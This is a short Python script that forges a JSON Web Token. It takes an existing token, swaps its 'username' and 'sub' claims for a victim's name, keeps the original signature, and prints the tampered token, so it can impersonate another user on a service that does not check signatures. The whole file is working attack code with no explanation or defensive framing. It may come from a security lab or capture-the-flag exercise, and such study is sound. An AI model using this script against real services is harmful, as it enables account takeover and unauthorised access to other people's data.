#!/usr/bin/env python3
import base64, json, os

def decode_payload(seg: str):
    seg += '=' * (-len(seg) % 4)
    return json.loads(base64.urlsafe_b64decode(seg.encode()))

token = os.environ['TOKEN_B']
victim = os.environ['VICTIM_USER']
header, payload, signature = token.split('.')
data = decode_payload(payload)
data['username'] = victim
data['sub'] = victim
new_payload = base64.urlsafe_b64encode(json.dumps(data, separators=(',', ':')).encode()).rstrip(b'=').decode()
print(f'{header}.{new_payload}.{signature}')
